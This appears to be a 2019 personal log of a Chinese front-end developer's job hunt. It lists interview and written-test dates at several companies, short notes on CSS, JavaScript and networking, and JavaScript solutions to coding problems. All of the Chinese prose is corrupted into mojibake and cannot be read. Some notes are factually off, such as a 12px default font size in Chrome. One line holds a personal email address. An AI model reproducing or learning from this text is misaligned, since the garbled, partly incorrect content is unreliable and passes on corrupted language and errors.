åº”è˜è¯¥å²—ä½çš„ä¼˜åŠ¿ã€‚ï¼ˆé™100å­—ï¼‰ å…·æœ‰UIåº“å¼€å‘çš„ç»éªŒï¼Œç†Ÿæ‚‰å›¢é˜Ÿåä½œæµç¨‹å…·æœ‰è‰¯å¥½æ²Ÿé€šèƒ½åŠ›ã€è¾ƒå¼ºå­¦ä¹ èƒ½åŠ›ã€å›¢é˜Ÿåä½œç²¾ç¥žï¼Œèƒ½æ‰¿å—å·¥ä½œåŽ‹åŠ› 3.ä»¤äººå´©æºƒçš„åœ¨çº¿è¯„æµ‹ IQé¢˜åŠ å¥¥æ•° 07.31ç½‘æ˜“ç½‘æ˜“æ¸¸æˆé€šè¿‡æ‰‹æœºç™»å½•æŠ•äº†ä¸¤ä¸ªå²—ä½ äº’è”ç½‘é€šè¿‡æ³¨å†Œçš„CatcherInSky98@163.comåˆæ³¨å†Œäº†ä¸€æ¬¡ å…¬ä¼—å·é€šè¿‡èº«ä»½è¯å’Œæ‰‹æœºå·æŸ¥è¯¢åˆ°çš„ä¸º163æŠ•é€’ 2019.0808.03ç½‘æ˜“ç¬”è¯• 120åˆ† 20 å•é€‰ 20 ç¼–ç¨‹ ï¼ˆCSSå†™ç»„ä»¶+ç”¨JavaScriptå†™æ–¹æ³•ï¼‰ 80 ç®—æ³• https://www.nowcoder.com/discuss/216237 08.074399æŠ•ç®€åŽ† è™Žç‰™å†…æŽ¨æŠ•ç®€åŽ† 08.08ç½‘æ˜“è½¬æŠ•å®¢æˆ·ç«¯/æœåŠ¡ç«¯å¼€å‘ éœ€å†æ¬¡ç¬”è¯• çœ‹å²—ä½è¦æ±‚ 08.09ç½‘æ˜“æš‚å®šå®¢æˆ·ç«¯å¼€å‘ å¤šç›Šem/rem ç›¸å¯¹é•¿åº¦å•ä½ emç›¸å¯¹äºŽçˆ¶å…ƒç´ ï¼Œremç›¸å¯¹äºŽæ ¹å…ƒç´ å…ƒç´  chromeé»˜è®¤çš„å­—ä½“å¤§å°æ˜¯12pxï¼Œä¹Ÿå°±æ˜¯1emé»˜è®¤ä¸º12pxï¼Œå¦‚æžœæœ€å¤–å±‚çš„çˆ¶å…ƒç´ ç›´æŽ¥æŠŠfont-sizeè®¾ä¸º1.5emï¼Œé‚£ä¹ˆè¯¥å…ƒç´ çš„å­—ä½“å¤§å°ä¸º18pxï¼ˆ12*1.5ï¼‰ã€‚ å †æŽ’ åˆå§‹åŒ–å»ºå †çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼ŒæŽ’åºé‡å»ºå †çš„æ—¶é—´å¤æ‚åº¦ä¸ºnlog(n) å› ä¸ºå †æŽ’åºæ˜¯å°±åœ°æŽ’åºï¼Œç©ºé—´å¤æ‚åº¦ä¸ºå¸¸æ•°ï¼šO(1) background-color/image background-colorèƒŒæ™¯é¢œè‰²æ˜¯åŒ…å«è¾¹æ¡†borderï¼Œè¾¹æ¡†å¦‚æžœä¸è®¾ç½®é¢œè‰²ï¼Œé»˜è®¤ä¼šé‡‡ç”¨æ–‡æœ¬é¢œè‰²ï¼Œè€Œæ–‡æœ¬é¢œè‰²é»˜è®¤æ˜¯é»‘è‰²ã€‚ background-imageèƒŒæ™¯å›¾ç‰‡ background-imageèƒŒæ™¯å›¾ç‰‡å æ®äº†å…ƒç´ çš„å…¨éƒ¨å°ºå¯¸ï¼ŒåŒ…æ‹¬å†…è¾¹è·paddingå’Œè¾¹æ¡†borderï¼Œä½†ä¸åŒ…æ‹¬å¤–è¾¹è·marginã€‚ https://blog.csdn.net/weimob258616/article/details/89162851 SVG è·¯å¾„ - å…ƒç´ ç”¨äºŽå®šä¹‰ä¸€ä¸ªè·¯å¾„ã€‚ ä¸‹é¢çš„å‘½ä»¤å¯ç”¨äºŽè·¯å¾„æ•°æ®ï¼š M = moveto L = lineto H = horizontal lineto V = vertical lineto C = curveto S = smooth curveto Q = quadratic BÃ©zier curve T = smooth quadratic BÃ©zier curveto A = elliptical Arc Z = closepath æ³¨æ„ï¼šä»¥ä¸Šæ‰€æœ‰å‘½ä»¤å‡å…è®¸å°å†™å­—æ¯ã€‚å¤§å†™è¡¨ç¤ºç»å¯¹å®šä½ï¼Œå°å†™è¡¨ç¤ºç›¸å¯¹å®šä½ã€‚ 123&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt; &lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt;&lt;/svg&gt; åžƒåœ¾å›žæ”¶ä¸Žå†…å­˜æ³„æ¼ URL/URI 08.11ç½‘æ˜“ç¬”è¯•åªèƒ½C/Javaï¼Œåšä¸åŠ¨ï¼Œå‘Šè¾ž å­—èŠ‚è·³åŠ¨æŠ•äº† å¿«æ‰‹08.25å­—èŠ‚è·³åŠ¨ç¬”è¯• 100/400 å¿«æ‰‹ç¬”è¯• 08.27BIGOæŠ•äº† ç”µä¿¡æŠ•äº† 08.29å­—èŠ‚è§†é¢‘é¢ UDP/TCP POST/GET POSTå®‰å…¨æ€§ HTTP/2.0 123456789101112131415ç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œå®ƒçš„ç¬¬ i ä¸ªå…ƒç´ æ˜¯ä¸€æ”¯ç»™å®šçš„è‚¡ç¥¨åœ¨ç¬¬ i å¤©çš„ä»·æ ¼ã€‚è®¾è®¡ä¸€ä¸ªç®—æ³•æ¥è®¡ç®—ä½ æ‰€èƒ½èŽ·å–çš„æœ€å¤§åˆ©æ¶¦ã€‚æ³¨æ„: ä½ ä¸èƒ½åŒæ—¶å‚ä¸Žå¤šç¬”äº¤æ˜“ï¼ˆä½ å¿…é¡»åœ¨å†æ¬¡è´­ä¹°å‰å‡ºå”®æŽ‰ä¹‹å‰çš„è‚¡ç¥¨ï¼‰ã€‚ç¤ºä¾‹ 1:è¾“å…¥: [5,3,3,0,0,3,1,4]è¾“å‡º: 6function profits(arr)&#123; let n = arr.length,profit=0; for(let i=0;i&lt;n-1;i++)&#123; if(arr[i]&lt;arr[i+1])&#123; profit+=arr[i+1]-arr[i] &#125; &#125; return profit&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354 * JSã€CSSç­‰é™æ€èµ„æºè·¯å¾„ï¼Œå…è®¸å‡ºçŽ° &quot;..&quot;ã€&quot;.&quot; ã€ &quot;//&quot;ï¼Œè¯·ç®€åŒ–è¿™äº›èµ„æºè·¯å¾„ï¼ŒæŠŠå®ƒä»¬å˜æˆæœ€çŸ­å­—ç¬¦ä¸²ã€‚* æ³¨ï¼šä¸€ä¸ªç‚¹ï¼ˆ.ï¼‰è¡¨ç¤ºå½“å‰ç›®å½•æœ¬èº«ï¼›æ­¤å¤–ï¼Œä¸¤ä¸ªç‚¹ ï¼ˆ..ï¼‰ è¡¨ç¤ºå°†ç›®å½•åˆ‡æ¢åˆ°ä¸Šä¸€çº§ï¼ˆæŒ‡å‘çˆ¶ç›®å½•ï¼‰ï¼›ä¸¤è€…éƒ½å¯ä»¥æ˜¯å¤æ‚ç›¸å¯¹è·¯å¾„çš„ç»„æˆéƒ¨åˆ†ã€‚* &lt;script src=&quot;//s3.pstatp.com/eesz/.././resource/./bear/js//app.0fa757caa42b59caf8f0.js&quot;&gt;&lt;/script&gt;* ç¤ºä¾‹ï¼š//s3.pstatp.com/eesz/.././resource/./bear/js//app.0fa757caa42b59caf8f0.js* ç»“æžœï¼š//s3.pstatp.com/resource/bear/js/app.0fa757caa42b59caf8f0.jsfunction shorten(str)&#123; let father = /\w+ \/ \. \. \//g // eesz/.. let self = /\.\//g //./ let double = /\/\//g str = str.replace(father,&quot;&quot;) str = str.replace(self,&quot;&quot;) str = str.replace(double,&quot;&quot;) return str&#125;function shorten2(str)&#123; let n = str.length,url = false; if(str.charAt(0)==&quot;/&quot;&amp;&amp;str.charAt(1)==&quot;/&quot;)&#123; url =true str = str.slice(2) &#125; let arr = str.split(&quot;/&quot;) for(let i = 0;i&lt; arr.length;i++)&#123; if(arr[i] === &quot;&quot;||arr[i]===&quot;.&quot;)&#123; arr.splice(i,1) i-- &#125;else if(arr[i]===&quot;..&quot;)&#123; arr.splice(i-1,2) i-=2 &#125; &#125; str = arr.join(&quot;/&quot;) if(url)&#123; str = &quot;//&quot;+str &#125; return str&#125;var simplifyPath = function(path) &#123; var result = &apos;&apos; var tempPath = [] var paths = path.split(&apos;/&apos;) paths.map(val =&gt; &#123; if(val &amp;&amp; val === &apos;..&apos;) &#123; tempPath.pop() &#125;else if(val &amp;&amp; val !== &apos;.&apos;) &#123; tempPath.push(val) &#125; &#125;) tempPath.length ? result = &apos;/&apos;+tempPath.join(&apos;/&apos;) : result = &apos;/&apos; return result&#125;; 2019.0909.02BIGOç¬”è¯• ä¸€ã€å•é€‰ SQL TCP/UDP ä¿ç•™åœ°å€ç§æœ‰åœ°å€ï¼ˆå†…éƒ¨å±€åŸŸç½‘å¯ä»¥ä½¿ç”¨çš„ï¼‰ Açº§ï¼š10.0.0.0 - 10.255.255.255 Bçº§ï¼š172.16.0.0 - 172.31.255.255 Cçº§ï¼š192.168.0.0 - 192.168.255.255 ä¿ç•™åœ°å€ï¼ˆç‰¹æ®Šç”¨é€”çš„ï¼‰ Aç±»ï¼š127.X.X.X Bç±»ï¼š169.254.X.X æ‰©å±•ä¿ç•™åœ°å€ è‹¥å¹² åŒ¿åå‡½æ•°ä¸Žé—­åŒ… æ ˆ è¿›ç¨‹ä¸Žçº¿ç¨‹ å››æ¬¡æŒ¥æ‰‹ è¿›ç¨‹ä»Žè¿è¡Œå˜ç­‰å¾…ï¼ˆè¾“å…¥æˆ–è¾“å‡ºäº‹ä»¶å‘ç”Ÿ ï¼‰è¿›ç¨‹çš„çŠ¶æ€æœ‰å°±ç»ªã€è¿è¡Œå’Œé˜»å¡ž3ç§ã€‚å½“ä¸€ä¸ªå°±ç»ªè¿›ç¨‹è¢«è°ƒåº¦ç¨‹åºé€‰ä¸­ï¼Œåˆ™è¯¥è¿›ç¨‹å°±ä»Žå°±ç»ªå˜ä¸ºè¿è¡Œï¼›å½“ä¸€ä¸ªè¿è¡Œçš„è¿›ç¨‹ç­‰å¾…æŸäº‹ä»¶æˆ–è€…ç”³è¯·çš„èµ„æºå¾—ä¸åˆ°æ»¡è¶³æ—¶ï¼Œåˆ™è¯¥è¿›ç¨‹ç”±è¿è¡Œå˜ä¸ºé˜»å¡žï¼›å½“ä¸€ä¸ªé˜»å¡žçš„è¿›ç¨‹ç­‰å¾…çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œåˆ™è¯¥è¿›ç¨‹ç”±é˜»å¡žå˜ä¸ºå°±ç»ªï¼›å½“ä¸€ä¸ªè¿›ç¨‹çš„æ—¶é—´ç‰‡ç”¨å®Œæ—¶ï¼Œåˆ™è¯¥è¿›ç¨‹ç”±è¿è¡Œå˜ä¸ºå°±ç»ªã€‚ Promise ç¨³å®šæŽ’åºä¸¤ä¸ªç›¸ç­‰çš„å…ƒç´ æŽ’åºè¿‡ç¨‹ä¸ä¼šäº¤æ¢ä½ç½®å †æŽ’åºã€å¿«é€ŸæŽ’åºã€å¸Œå°”æŽ’åºã€ç›´æŽ¥é€‰æ‹©æŽ’åºæ˜¯ä¸ç¨³å®šçš„æŽ’åºç®—æ³•ï¼Œè€ŒåŸºæ•°æŽ’åºã€å†’æ³¡æŽ’åºã€ç›´æŽ¥æ’å…¥æŽ’åºã€æŠ˜åŠæ’å…¥æŽ’åºã€å½’å¹¶æŽ’åºæ˜¯ç¨³å®šçš„æŽ’åºç®—æ³•ã€‚ ç®€å•é¢˜ ç®€å•é¢˜ CSS IE9å…¼å®¹animationï¼Ÿå•ä½ï¼Ÿflexï¼š3IE9 ä¸æ”¯æŒanimation å¤šæ€ä½œç”¨ï¼šæŠŠä¸åŒçš„å­ç±»å¯¹è±¡éƒ½å½“ä½œçˆ¶ç±»æ¥çœ‹ï¼Œå¯ä»¥å±è”½ä¸åŒå­ç±»å¯¹è±¡ä¹‹é—´çš„å·®å¼‚ï¼Œå†™å‡ºé€šç”¨çš„ä»£ç ï¼Œåšå‡ºé€šç”¨çš„ç¼–ç¨‹ï¼Œä»¥é€‚åº”éœ€æ±‚çš„ä¸æ–­å˜åŒ–ã€‚ èµ‹å€¼ä¹‹åŽï¼Œçˆ¶ç±»åž‹çš„å¼•ç”¨å°±å¯ä»¥æ ¹æ®å½“å‰èµ‹å€¼ç»™å®ƒçš„å­å¯¹è±¡çš„ç‰¹æ€§ä»¥ä¸åŒçš„æ–¹å¼è¿ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œçˆ¶äº²çš„è¡Œä¸ºåƒå„¿å­ï¼Œè€Œä¸æ˜¯å„¿å­çš„è¡Œä¸ºåƒçˆ¶äº²ã€‚ å¤šæ€æ˜¯é¢å‘å¯¹è±¡çš„é‡è¦ç‰¹æ€§,ç®€å•ç‚¹è¯´:â€œä¸€ä¸ªæŽ¥å£ï¼Œå¤šç§å®žçŽ°â€ï¼Œå°±æ˜¯åŒä¸€ç§äº‹ç‰©è¡¨çŽ°å‡ºçš„å¤šç§å½¢æ€ã€‚ç¼–ç¨‹å…¶å®žå°±æ˜¯ä¸€ä¸ªå°†å…·ä½“ä¸–ç•Œè¿›è¡ŒæŠ½è±¡åŒ–çš„è¿‡ç¨‹ï¼Œå¤šæ€å°±æ˜¯æŠ½è±¡åŒ–çš„ä¸€ç§ä½“çŽ°ï¼ŒæŠŠä¸€ç³»åˆ—å…·ä½“äº‹ç‰©çš„å…±åŒç‚¹æŠ½è±¡å‡ºæ¥, å†é€šè¿‡è¿™ä¸ªæŠ½è±¡çš„äº‹ç‰©, ä¸Žä¸åŒçš„å…·ä½“äº‹ç‰©è¿›è¡Œå¯¹è¯ã€‚ HTNLæ ‡ç­¾ äºŒã€é—®ç­” æ•°æ®ç±»åž‹ã€typeofè¿”å›žå€¼string undefined number null boolean object symbolstring undefined number object boolean object symbol function cssä¸‰è§’å½¢ æ­£åˆ™ å‘å¸ƒè®¢é˜…æ¨¡å¼ å›žæ–‡é“¾è¡¨ æ–°æ—§ç‰ˆæœ¬å¯¹æ¯” å­—ç¬¦ä¸²æ˜¯å¦å…¨ç”±å­—å…¸ä¸­å…ƒç´ æ‹¼æˆ SHEINå‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆ 3kæ¸¸æˆ09.05BIGä»¥ä¸ºä¸€é¢å¾ˆåŸºç¡€ï¼Œçœ‹äº†ä¸€å¤©çš„ç½‘ç»œ/æµè§ˆå™¨/html/css ç»“æžœES6+webpack+react å“Ž Array/object æ–°æ–¹æ³• classç»§æ‰¿ super super.p symbol set(NAN) map webpack loader pludgin reactå¼‚æ­¥ virtual dom set getElement set è¾“å‡ºä»€ä¹ˆ 09.10ä¸‰ä¸ƒç¬”è¯• let const JS æ¨¡å— AMDÂ·CMD ComconJSÂ·ES6 ç§æœ‰åœ°å€ æ²¡è®° $(document).ready() window.onload() æƒé™chmod chown 765 764 cssä¼˜å…ˆçº§ cssç»§æ‰¿ httpçŠ¶æ€ç  SQLè¯­å¥ åŒæºç­–ç•¥ display none visibility hidden BFC varæå‡ è½¯ä»¶æµ‹è¯• æ¦‚çŽ‡é¢˜ ä½œç”¨åŸŸ this å®Œå…¨äºŒå‰æ ‘èŠ‚ç‚¹æ•°å’Œé«˜åº¦ å¼‚æ­¥ å¼‚æ­¥åŠ è½½ defer sync è‚¡ç¥¨LeetCode objectæ•°ç»„åŽ»é‡ 09.13æŠ•äº†ä¸€å¤§æ³¢ï¼Œæˆ‘éƒ½å¿˜è®°æŠ•äº†å¤šå°‘ 09.14é…·ç‹—ç¬”è¯• å˜é‡æå‡ï¼Œç«‹å³æ‰§è¡Œå‡½æ•°åŒ¿åå‡½æ•°å¹¶ä¸ä¼šæå‡ HTTPS 443 cssä¼˜å…ˆ this Definition Liståˆ—è¡¨æ ‡é¢˜ Titleåˆ—è¡¨å†…å®¹ DescriptionMonthSavings Row Head January$100Description æ­£åˆ™ HTTPçŠ¶æ€ç  LocalStorage è·¨åŸŸ æ ‡å‡†æ–‡æ¡£æµ display:noneä¸ä¼šä½¿ä¸€ä¸ªå…ƒç´ è„±ç¦»æ ‡å‡†æ–‡æ¡£æµï¼š ï¼ˆ1ï¼‰æµ®åŠ¨ ï¼ˆ2ï¼‰ç»å¯¹å®šä½ ï¼ˆ3ï¼‰å›ºå®šå®šä½ HTTP 1.1æ”¯æŒé•¿è¿žæŽ¥(PersistentConnection)å’Œè¯·æ±‚çš„æµæ°´çº¿(Pipelining)å¤„ç† å¼ºåˆ¶ç±»åž‹è½¬æ¢0==false trueundefined==0 falsenull==false false ä¼˜åŒ– è™šæ‹Ÿdom å†…å­˜ å¯¹è±¡ ä¸åŒæ­¥ è·¨åŸŸ ç”Ÿæˆéšæœºæ’­æ”¾åˆ—è¡¨ 09.19 JSONJSONé”®/å€¼å¯¹ç”±é”®å’Œå€¼ç»„æˆï¼Œé”®å¿…é¡»æ˜¯å­—ç¬¦ä¸²ï¼Œç”¨åŒå¼•å·åŒ…è£¹ï¼Œå€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼ˆstringï¼‰ã€æ•°å€¼(number) ã€å¯¹è±¡ï¼ˆobjectï¼‰ã€æ•°ç»„ï¼ˆarrayï¼‰ã€trueã€falseã€nullã€‚ false+true//1(true+false)&gt;2//false(true+false)&gt;2+true//false ç¨€ç–æ•°ç»„å°±æ˜¯æ•°ç»„ä¸­å¤šæ•°æˆå‘˜æ²¡æœ‰æœ‰æ•ˆçš„ä¿¡æ¯ï¼Œåªæœ‰å°‘æ•°æˆå‘˜æœ‰æœ‰æ•ˆæ•°æ® service worker dipslay:none,visibility:hiddenéƒ½ä¼šè¢«æž„å»ºDOMæ ‘è§£æžHTMLæž„å»ºDOMæ ‘åœ¨å‰é¢ï¼›è€Œæ ·å¼çš„åŠ è½½åœ¨åŽé¢ dispaly:noneçš„å…ƒç´ ä¸ä¼šè¢«åŠ å…¥åˆ°Render Tree è€Œvisibility:hiddençš„å…ƒç´ ä¼šè¢«åŠ å…¥åˆ°Render Treeï¼› transform:rotate(7deg); ç†è®ºä¸Šï¼Œæ‰€æœ‰å¯è¾“å…¥çš„åœ°æ–¹æ²¡æœ‰å¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¤„ç†çš„è¯ï¼Œéƒ½ä¼šå­˜åœ¨XSSæ¼æ´žï¼Œæ¼æ´žçš„å±å®³å–å†³äºŽæ”»å‡»ä»£ç çš„å¨åŠ›ï¼Œæ”»å‡»ä»£ç ä¹Ÿä¸å±€é™äºŽscriptã€‚ åŸºäºŽTCPçš„åº”ç”¨å±‚åè®®æœ‰ï¼šSMTPã€TELNETã€HTTPã€FTP åŸºäºŽUDPçš„åº”ç”¨å±‚åè®®ï¼šDNSã€TFTPï¼ˆç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ã€RIPï¼ˆè·¯ç”±é€‰æ‹©åè®®ï¼‰ã€DHCPã€BOOTPï¼ˆæ˜¯DHCPçš„å‰èº«ï¼‰ã€IGMPï¼ˆInternetç»„ç®¡ç†åè®®ï¼‰ DNSå ç”¨53å·ç«¯å£ï¼ŒåŒæ—¶ä½¿ç”¨TCPå’ŒUDPåè®®ã€‚ DNSåŒºåŸŸä¼ è¾“çš„æ—¶å€™ä½¿ç”¨TCPåè®® åŸŸåè§£æžæ—¶ä½¿ç”¨UDPåè®® font-size å›žæµ insertAfter()å’ŒinsertBefore() insertAdjacentHTML iframe 0.8-0.6==0.2false//0.200000000000000070.2-0.1==0.1true setTimeout(()=&gt;{console.log(â€œâ€)},0)910 FTP21 SSH22 ç”µæŠ¥UDP ä¿è¯æ–°åž‹åè®®PUDP(Passive UDP)ã€‚è¯¥åè®®é€šè¿‡åœ¨ä¼ ç»ŸTCP/IPåè®®çš„UPDå±‚å’Œåº”ç”¨å±‚ä¸­é—´åŠ å…¥ä¸€å±‚å¯é UDPæ¨¡å—,ä¿è¯æ•°æ®çš„å¯é ä¼ è¾“,å®žçŽ°äº†åŸºäºŽUDPæŠ¥æ–‡ä¼ è¾“çš„å¯é ä¼ è¾“ã€‚ a = /ff/ b = /ff/ a!=b 09.20è…¾è®¯ç¬”è¯•ï¼Œåšå¾—å¤ªè´ªäº†ï¼Œè€è€å®žå®žä¸€é¢˜ä¸€é¢˜åšå°±èƒ½åšä¸¤é¢˜å¤šäº† 1.ç¢°ç¢°æ•° ç»™ä¸€ä¸ªæ•°ç»„å’Œè‹¥å¹²ç¢°ç¢°æ•°ç»„ æ•°ç»„æŒ‰é¡ºåºç»„åˆ 1234ç»„åˆæˆ 1 12 123 1234 2 23 234 3 34 4è¿™ç§ ä½†æ˜¯å‡ºçŽ°ç¢°ç¢°æ•°ç»„åˆ™ä¸ç®— æ±‚ç»„åˆæ•° æ•°ç»„æ¯”è¾ƒä¸èƒ½== 123456789101112131415161718192021222324252627282930313233343536373839404142function combo(arr,peng)&#123; let crr=[],ans=0; for(let i = 0;i&lt;arr.length;i++)&#123; crr = [] for(let j = i;j&lt;arr.length;j++)&#123; crr.push(arr[j]) if(crr.has(peng))&#123; console.log(&quot;break&quot;) break &#125;else&#123; ans++ console.log(crr) &#125; &#125; &#125; return ans&#125;Array.prototype.has = function(peng)&#123; if(this.length&lt;2)&#123; return false &#125;else&#123; let x = [this[this.length-2],this[this.length-1]]; for(let pe of peng)&#123; if(equar(x,pe))&#123; return true &#125; &#125; return false &#125;&#125;function equar(a, b) &#123; if (a.length !== b.length) &#123; return false &#125; else &#123; for (let i = 0; i &lt; a.length; i++) &#123; if (a[i] != b[i]) &#123; return false &#125; &#125; return true; &#125;&#125; 2.è‡ªåŠ¨æ—¥æœŸ éªŒè¯é—°å¹´ åˆæ³•åŒ–æ—¥æœŸï¼Œè‡ªåŠ¨è®¡ç®—è¿­ä»£ä½¿æ—¥æœŸåœ¨åˆç†èŒƒå›´ è¾“å‡º 123456789101112131415161718192021222324252627282930313233343536373839404142434445function run(year)&#123; if(year&gt;=3200)&#123; if(year%3200==0&amp;&amp;year%172800!=0)&#123; return false &#125; &#125; if(year%400==0)&#123; return true &#125;else if(year%4==0&amp;&amp;year%100!=0)&#123; return true &#125; return false&#125;function date(y,m,d)&#123; let x; run(y)?x=29:x=28; let mouth = [31,x,31,30,31,30,31,31,30,31,30,31]; while(d&gt;mouth[m-1])&#123; d -= mouth[m-1] m++ if(m&gt;12)&#123; y++ run(y)?x=29:x=28; m-=12 &#125; &#125; y+=&quot;&quot; m+=&quot;&quot; d+=&quot;&quot; while(y.length&lt;4)&#123; y=&quot;0&quot;+y &#125; while(m.length&lt;2)&#123; m=&quot;0&quot;+m &#125; while(d.length&lt;2)&#123; d=&quot;0&quot;+d &#125; return y+&quot;-&quot;+m+&quot;-&quot;+d&#125;let arr = readline().split(&quot; &quot;).map((it)=&gt;&#123; return parseInt(it)&#125;);console.log(date(arr[0],arr[1],arr[2])) 3.èžºæ—‹è¯»äºŒç»´æ•°ç»„ èžºæ—‹è¾¹æ•°ä¸ºæ•°ç»„é•¿åº¦Nçš„2N-1 åªéœ€æŒ‰é¡ºåºæ‰§è¡Œå³å¯è®¡ç®—å³å¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function lX(arr)&#123; let res = [],n = arr.length, lx = 2*n-1,times=0,i=0,j=0,mode=0,turn=0; while(times&lt;n*n)&#123; x = Math.floor(n-turn/2) if(mode==0)&#123; for(let k = 0;k&lt;x;k++)&#123; res.push(arr[i][j]) times++ j++ &#125; mode=1 turn++ j-- i++ &#125;else if(mode==1)&#123; for(let k = 0;k&lt;x;k++)&#123; res.push(arr[i][j]) times++ i++ &#125; mode=2 turn++ i-- j-- &#125;else if(mode==2)&#123; for(let k = x-1;k&gt;-1;k--)&#123; res.push(arr[i][j]) times++ j-- &#125; mode=3 turn++ j++ i-- &#125;else if(mode==3)&#123; for(let k = x-1;k&gt;-1;k--)&#123; res.push(arr[i][j]) times++ i-- &#125; mode=0 turn++ i++ j++ &#125; &#125; return res&#125;//[1, 2, 3, 6, 9, 8, 7, 4, 5]//[1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10]lX([[1,2,3,4],[5,6,7,8],[9,10,11,12],[13,14,15,16]])//[1, 2, 3, 4, 5, 10, 15, 20, 25, 24, 23, 22, 21, 16, 11, 6, 7, 8, 9, 14, 19, 18, 17, 12, 13] 4.è¶…å‡ºå­—æ•°æŒ‰è¡Œæˆªæ–­ æ­£åˆ™/\w\W$/ 5.FFT 09.21ä¹ä¿¡ substr(start [ï¼Œlength]) ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•æ˜¯0ï¼Œstartå¿…é€‰ lengthå¯é€‰ substring(start [, end]) ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•æ˜¯0ï¼Œstartå¿…é€‰ endå¯é€‰ fetchå·ç§°æ˜¯AJAXçš„æ›¿ä»£å“ï¼Œæ˜¯åœ¨ES6å‡ºçŽ°çš„ï¼Œä½¿ç”¨äº†ES6ä¸­çš„promiseå¯¹è±¡ã€‚Fetchæ˜¯åŸºäºŽpromiseè®¾è®¡çš„ã€‚Fetchçš„ä»£ç ç»“æž„æ¯”èµ·ajaxç®€å•å¤šäº†ï¼Œå‚æ•°æœ‰ç‚¹åƒjQuery ajaxã€‚ä½†æ˜¯ï¼Œä¸€å®šè®°ä½fetchä¸æ˜¯ajaxçš„è¿›ä¸€æ­¥å°è£…ï¼Œè€Œæ˜¯åŽŸç”Ÿjsï¼Œæ²¡æœ‰ä½¿ç”¨XMLHttpRequestå¯¹è±¡ã€‚ åŸŸåä¸€ä¸ªå®Œæ•´çš„åŸŸåï¼ˆ.comã€.netã€.eduã€.govç­‰ï¼‰ç”±äºŒä¸ªæˆ–äºŒä¸ªä»¥ä¸Šéƒ¨åˆ†ç»„æˆï¼Œå„éƒ¨åˆ†ä¹‹é—´ç”¨è‹±æ–‡çš„å¥å·â€.â€æ¥åˆ†éš”ï¼Œæœ€åŽä¸€ä¸ªâ€.â€çš„å³è¾¹éƒ¨åˆ†ç§°ä¸ºé¡¶çº§åŸŸå (Top-level Domain Name)ï¼Œé¡¶çº§åŸŸåâ€œ.â€çš„å·¦è¾¹éƒ¨åˆ†ç§°ä¸ºäºŒçº§åŸŸå (Second-level Domain Name)ï¼ŒäºŒçº§åŸŸåçš„å·¦è¾¹éƒ¨åˆ†ç§°ä¸ºä¸‰çº§åŸŸåï¼Œä»¥æ­¤ç±»æŽ¨ï¼Œæ¯ä¸€çº§çš„åŸŸåæŽ§åˆ¶å®ƒä¸‹ä¸€çº§åŸŸåçš„åˆ†é…ã€‚1 com2 baidu.com3 pan.baidu.com Date å¯¹è±¡æ–¹æ³• | æ–¹æ³• | æè¿° || :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ | :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ || Date() | è¿”å›žå½“æ—¥çš„æ—¥æœŸå’Œæ—¶é—´ã€‚ || getDate() | ä»Ž Date å¯¹è±¡è¿”å›žä¸€ä¸ªæœˆä¸­çš„æŸä¸€å¤© (1 ~ 31)ã€‚ || getDay() | ä»Ž Date å¯¹è±¡è¿”å›žä¸€å‘¨ä¸­çš„æŸä¸€å¤© (0 ~ 6)ã€‚ || getMonth() | ä»Ž Date å¯¹è±¡è¿”å›žæœˆä»½ (0 ~ 11)ã€‚ || getFullYear() | ä»Ž Date å¯¹è±¡ä»¥å››ä½æ•°å­—è¿”å›žå¹´ä»½ã€‚ || getYear() | è¯·ä½¿ç”¨ getFullYear() æ–¹æ³•ä»£æ›¿ã€‚ || getHours() | è¿”å›ž Date å¯¹è±¡çš„å°æ—¶ (0 ~ 23)ã€‚ || getMinutes() | è¿”å›ž Date å¯¹è±¡çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ || getSeconds() | è¿”å›ž Date å¯¹è±¡çš„ç§’æ•° (0 ~ 59)ã€‚ || getMilliseconds() | è¿”å›ž Date å¯¹è±¡çš„æ¯«ç§’(0 ~ 999)ã€‚ || getTime() | è¿”å›ž 1970 å¹´ 1 æœˆ 1 æ—¥è‡³ä»Šçš„æ¯«ç§’æ•°ã€‚ || getTimezoneOffset() | è¿”å›žæœ¬åœ°æ—¶é—´ä¸Žæ ¼æž—å¨æ²»æ ‡å‡†æ—¶é—´ (GMT) çš„åˆ†é’Ÿå·®ã€‚ || getUTCDate() | æ ¹æ®ä¸–ç•Œæ—¶ä»Ž Date å¯¹è±¡è¿”å›žæœˆä¸­çš„ä¸€å¤© (1 ~ 31)ã€‚ || getUTCDay() | æ ¹æ®ä¸–ç•Œæ—¶ä»Ž Date å¯¹è±¡è¿”å›žå‘¨ä¸­çš„ä¸€å¤© (0 ~ 6)ã€‚ || getUTCMonth() | æ ¹æ®ä¸–ç•Œæ—¶ä»Ž Date å¯¹è±¡è¿”å›žæœˆä»½ (0 ~ 11)ã€‚ || getUTCFullYear() | æ ¹æ®ä¸–ç•Œæ—¶ä»Ž Date å¯¹è±¡è¿”å›žå››ä½æ•°çš„å¹´ä»½ã€‚ || getUTCHours() | æ ¹æ®ä¸–ç•Œæ—¶è¿”å›ž Date å¯¹è±¡çš„å°æ—¶ (0 ~ 23)ã€‚ || getUTCMinutes() | æ ¹æ®ä¸–ç•Œæ—¶è¿”å›ž Date å¯¹è±¡çš„åˆ†é’Ÿ (0 ~ 59)ã€‚ || getUTCSeconds() | æ ¹æ®ä¸–ç•Œæ—¶è¿”å›ž Date å¯¹è±¡çš„ç§’é’Ÿ (0 ~ 59)ã€‚ || 